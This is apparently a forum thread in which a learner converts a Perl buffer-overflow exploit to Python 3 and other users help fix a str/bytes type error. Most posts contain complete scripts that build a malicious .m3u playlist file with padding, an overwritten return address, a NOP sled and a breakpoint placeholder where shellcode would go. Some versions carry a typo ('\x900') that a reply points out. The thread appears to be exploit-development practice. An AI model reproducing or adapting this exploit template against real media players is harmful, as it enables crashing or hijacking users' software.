I've been learning basic buffer overflow exploits from a website; the website has the code in Perl, but as the fact that I'm a Python'er, I was wondering how I could do this! I've been Googling everything I can think of but can't find a solution So here is the original Perl code:Code: Select allmy $file= "test1.m3u";my $junk= "A" x 26094;my $eip = pack('V',0x000ff730); my $shellcode = "\x90" x 25; $shellcode = $shellcode."\xcc";$shellcode = $shellcode."\x90" x 25; open($FILE,">$file");print $FILE $junk.$eip.$shellcode;close($FILE);print "m3u File Created successfully\n";And here's what I try in Python (3.1):Code: Select allfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print("m3u file created succesfully")But it consistently gives me the:Code: Select allTraceback (most recent call last): File "C:\Buffer Overflow\crash.py", line 9, in <module> file.write(junk + eip + shellcode)TypeError: Can't convert 'bytes' object to str implicitlyI've tried lots of other things, such as decoding, encoding, rewriting the pack() statement, and others, but I most consistently get that error, any suggestions?? (Other than "Learn Perl")

Learn to use the Metasploit Framework. It is meant for that!If that doesn't work out for you then this(15.6.4) might(WARNING: BIG WALL OF TEXT!)

Metasploit, when used by someone who doesn't understand WHY it works, is completely lame.Just taking a complete shot in the dark here, but it looks like it's having trouble interpreting your variables as strings. I'm not a Python person, but I know a lot of problems in just about any language can be cause by improper variable handling.

Hey, the link I provided is about your issue someone else already solved and logged. Better read the link else I will feel bad about all the 1 hour googleing and reading.Click this(Section 15.6.4)(WARNING: BIG WALL OF TEXT!)

I actually did read it already, and it's pretty much what got me to get the idea of converting all of it to bytes, thanks Also, I have that whole book in PDF, maybe I should get around to reading it "Knowledge is knowing that a tomato is a fruit, but Wisdom is knowing not to put it in a fruit salad."

Running this in Python 2.6.1 worked without any issues. The only difference from 3.1 was removing the parenthesis in the print statement. Code: Select allfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print "m3u file created succesfully"

Point is, in the transition from 2 to 3, there was a lot more focus on Unicode and encoding and stuff like that, which is pretty much the problem here...The working code (for me) if anyone else has this issue ever was:Code: Select allfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')####THE CHANGED LINE####file.write(bytes(junk, 'utf-8') + eip + bytes(shellcode, 'utf-8'))file.close()print("m3u file created succesfully")

py3 makes a distinction between strings and data:Code: Select all#!/usr/bin/env pythonfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print("m3u file created succesfully")print(type(eip))print(eip)Code: Select all#!/usr/bin/env python3import sysfrom struct import packfilename = 'test2.m3u'junk = b"A" * 26059eip = pack('L', 0x0015fcc4)shellcode = b"\x90" * 25shellcode = shellcode + b"\xcc"shellcode = shellcode + (b"\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print("m3u file created succesfully")print(type(eip))sys.stdout.buffer.write(eip)sys.stdout.write("\n")Code: Select all$ ./py2.py m3u file created succesfully<type 'str'>��$ ./py3.pym3u file created succesfully<class 'bytes'>��$ diff test1.m3u test2.m3u $ Notice the py3 code 'b' prefix to interpret the hardcoded "strings" as bytes. Also, you probably meant "\x90".
